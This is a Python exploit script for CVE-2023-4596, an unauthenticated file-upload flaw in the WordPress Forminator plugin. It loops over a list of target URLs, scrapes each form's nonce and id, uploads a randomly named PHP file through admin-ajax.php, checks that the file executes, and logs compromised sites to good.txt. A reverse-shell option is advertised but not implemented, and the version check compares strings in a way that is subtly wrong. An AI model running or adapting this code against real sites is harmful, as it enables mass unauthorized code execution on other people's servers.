import requests
import datetime
import argparse
import re
import random
import string
import sys

print(r'''
   _______    ________    ___   ____ ___  _____       __ __  __________  _____
  / ____/ |  / / ____/   |__ \ / __ \__ \|__  /      / // / / ____/ __ \/ ___/
 / /    | | / / __/________/ // / / /_/ / /_ <______/ // /_/___ \/ /_/ / __ \ 
/ /___  | |/ / /__/_____/ __// /_/ / __/___/ /_____/__  __/___/ /\__, / /_/ / 
\____/  |___/_____/    /____/\____/____/____/        /_/ /_____//____/\____/  
                                https://github.com/X-Projetion/
''')

parser = argparse.ArgumentParser(description="Script to check for CVE-2023-4596")
parser.add_argument("-f", required=True, help="File containing URLs to check")
parser.add_argument("-v", action="store_true", help="Check for a (vulnerable) version")
parser.add_argument("-r", action="store_true", help="Get a reverse shell on the instance")

args = parser.parse_args()
url_file = args.f

# Function to generate a random filename
def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

# Read URLs from file
with open(url_file, 'r') as file:
    urls = file.readlines()

for full_url in urls:
    full_url = full_url.strip()
    if not full_url:
        continue

    print(f"\nProcessing URL: {full_url}")

    # Using regex to split the full URL into parts
    match = re.match(r"(https?://)(.*?)(/.*)?$", full_url)
    if match:
        http_prefix = match.group(1)
        new_domain = http_prefix + match.group(2)
        page = match.group(3) or "/"
    else:
        print("Invalid URL format")
        continue

    # Checking for a (vulnerable) version
    if args.v:
        version_check_url = new_domain.rstrip('/') + "/wp-content/plugins/forminator/readme.txt"
        try:
            response = requests.get(version_check_url, timeout=5)
            if response.status_code == 200:
                readme_content = response.text
                stable_tag_match = re.search(r"Stable tag:\s*([\d.]+)", readme_content)
                if stable_tag_match:
                    stable_tag = stable_tag_match.group(1)
                    if stable_tag <= "1.24.6":
                        print("[+] Vulnerable version found:", stable_tag)
                    else:
                        print("[-] Version is not vulnerable:", stable_tag)
                else:
                    print("[-] Could not determine Stable tag in readme.txt")
            else:
                print("[-] Unable to fetch readme.txt:", response.status_code)
        except requests.RequestException as e:
            print("[-] An error occurred while fetching readme.txt:", str(e))
        continue

    url = new_domain + "/wp-admin/admin-ajax.php"

    # Headers for the request
    headers = {
        "Content-Length": "1292",
        "Accept": "*/*",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarytsSnyRY1FWmgGHpA",
        "X-Requested-With": "XMLHttpRequest",
    }

    random_filename = generate_random_string(10) + ".php"

    # First request to retrieve the forminator_nonce and the form_id that is needed in the second request
    try:
        initial_response = requests.get(full_url, timeout=10)
        initial_response.raise_for_status()
    except requests.Timeout:
        print("[-] Request timed out. Server is unavailable.")
        continue
    except requests.RequestException as e:
        print("[-] An error occurred while fetching the initial page:", str(e))
        continue

    initial_response_text = initial_response.text

    # Extracting the forminator_nonce and form_id
    forminator_nonce_match = re.search(r'forminator_nonce"\s+value="(\b[0-9a-fA-F]{10}\b)"', initial_response_text)
    if forminator_nonce_match:
        forminator_nonce = forminator_nonce_match.group(1)
    else:
        print("[-] Could not extract forminator_nonce")
        print("Did you include the complete URL of a webpage that contains a Forminator file upload field in the command?")
        continue

    form_id_match = re.search(r'form_id"\s+value="([0-9]+)"', initial_response_text)
    if form_id_match:
        form_id = form_id_match.group(1)
    else:
        print("[-] Could not extract form_id")
        continue

    interact = "bejjuzvwqccuaqvhrxjnkufikqkiyj0r2.oast.fun"

    data = f"""------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="postdata-1-post-image"; filename="{random_filename}"
Content-Type: application/x-php

<?php echo hex2bin('4c7574666966616b6565'); ?>

------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="forminator_nonce"

{forminator_nonce}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="_wp_http_referer"

{page}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="form_id"

{form_id}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="current_url"

{new_domain}{page}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="action"

forminator_submit_form_custom-forms
"""

    print("\n[+] Sending payload to target")

    try:
        now = datetime.datetime.now()
        current_year = now.year
        current_month = str(now.month).zfill(2)
        uploaded_file_url = f"{new_domain}/wp-content/uploads/{current_year}/{current_month}/{random_filename}"
    
        response = requests.post(url, headers=headers, data=data, timeout=10)
        if response.status_code == 200 and 'Lutfifakee' in response.text:
            print("[+] Successful file upload!\n")
        else:
            print("[-] Server returned an unexpected response:", response.status_code)
            continue
    except requests.Timeout:
        print("[-] Request timed out. Server is unavailable.")
        continue
    except requests.RequestException as e:
        print("[-] An error occurred:", str(e))
        continue
    print("Uploaded File Location:", uploaded_file_url)
    print("\n[+] Check whether the file has been uploaded...")
    try:
        uploaded_file_response = requests.get(uploaded_file_url, timeout=5)
        if uploaded_file_response.status_code == 200 and 'Lutfifakee' in uploaded_file_response.text:
            print("[+] Successfully checked the uploaded file!")
            print("[+] Check for an incoming request")
            print("[+] The uploaded file is saved good.txt")
            open('good.txt', 'a').write(f'{uploaded_file_url}\n')
        else:
            print("[-] Server returned an unexpected response:", uploaded_file_response.status_code)
            continue
    except requests.Timeout:
        print("[-] Request timed out. This could be due to the server being unavailable or because you started a reverse shell")
        continue
    except requests.RequestException as e:
        print("[-] An error occurred:", str(e))
        continue
